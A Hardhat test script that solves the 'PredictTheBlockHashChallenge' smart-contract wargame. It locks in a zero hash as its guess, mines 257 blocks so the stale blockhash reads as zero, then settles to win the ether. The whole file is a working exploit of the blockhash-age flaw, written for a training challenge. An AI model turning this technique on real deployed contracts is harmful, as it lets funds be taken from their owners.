import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";


let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let sendValue = ethers.utils.parseEther("1");


before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("PredictTheBlockHashChallenge", attacker);
    //contract = await factory.deploy({value:sendValue});
    contract = factory.attach(`0xAaE20793d34C8F5D687D801f5c7dfBad33e91555`);
});

it("solves the challenge", async function () {
    let pretx = await contract.lockInGuess(`0x0000000000000000000000000000000000000000000000000000000000000000`, {value: sendValue});
    console.log(pretx.hash);
    for (let i = 0; i < 257; i++) {
        await ethers.provider.send("evm_increaseTime", [1]);
        await ethers.provider.send("evm_mine", []);
        console.log(await ethers.provider.getBlockNumber());
    }
    let attacktx = await contract.settle({gasLimit: 1e5});
    console.log(attacktx.hash);

});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});